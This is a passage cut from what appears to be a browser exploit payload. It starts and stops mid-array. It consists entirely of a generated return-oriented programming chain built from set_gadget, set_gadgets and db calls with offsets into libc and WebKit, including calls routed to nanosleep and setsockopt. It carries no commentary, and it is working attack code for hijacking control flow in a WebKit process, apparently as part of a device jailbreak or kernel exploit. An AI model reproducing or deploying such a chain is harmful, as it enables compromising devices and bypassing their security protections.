libc_base+50775, 
libc_base+793877, 
ropchain+213600, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+213672, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+213688, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+213840, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+213872, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+213856, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+213824, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+213944, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+213960, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+214072, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+214040, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
libc_base+793877, 
ropchain+214200, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+214216, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+214184, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+214320, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+214384, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+214336, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+214496, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+214488, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+214512, 
ropchain+216224, 
libc_base+793877, 
ropchain+214552, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+214656, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+214672, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+214792, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+214824, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+214776, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+214912, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+214928, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+215080, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+215112, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+215096, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+215064, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+215208, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+215192, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+215312, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+181592, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+215448, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+215464, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+215432, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+215560, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+215544, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+215640, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([65, 0]); 
set_gadget(libc_base+788575,); 
db([65, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+215792, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+215808, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+215776, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
libc_base+389047, 
libc_base+269973, 
libc_base+793877, 
ropchain+215976, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+215992, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+215960, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+216112, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+216144, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+216096, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+389047, 
libc_base+269973, 
libc_base+793877, 
ropchain+216216, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+882884, 
libc_base+793877, 
ropchain+216336, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+216352, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+216320, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+216456, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+216504, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+216472, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+216616, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+216608, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+216632, 
ropchain+218712, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([25, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([41, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+216864, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+216968, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+216984, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+217104, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+217136, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+217088, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+217224, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+217240, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+217392, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+217424, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+217408, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+217376, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+217520, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+217504, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+217624, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+221560, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+217760, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+217776, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+217744, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+217880, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+217928, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+217896, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+218040, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+218032, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+218056, 
ropchain+218504, 
libc_base+50775, 
libc_base+793877, 
ropchain+218112, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+218280, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+218312, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+218296, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+218264, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+218384, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+218400, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+218496, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+218480, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+397808, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+218664, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+220232, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+811575, 
ropchain+218728, 
libc_base+811575, 
ropchain+218744, 
libc_base+811575, 
ropchain+213440, 
libc_base+50775, 
libc_base+793877, 
ropchain+218784, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+218912, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+218896, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+218992, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+219096, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+219112, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+219216, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+219200, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+219272, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+219360, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+219488, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+219472, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+219568, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+219672, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+219688, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+219792, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+219776, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+219848, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([12, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+220000, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+219984, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+220096, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+220112, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+220224, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+220208, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
nanosleep_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+221552, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
setsockopt_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+222880, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+222952, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+223016, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([1032, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+223088, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+223216, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+223200, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+223296, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+223400, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+223416, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+223520, 
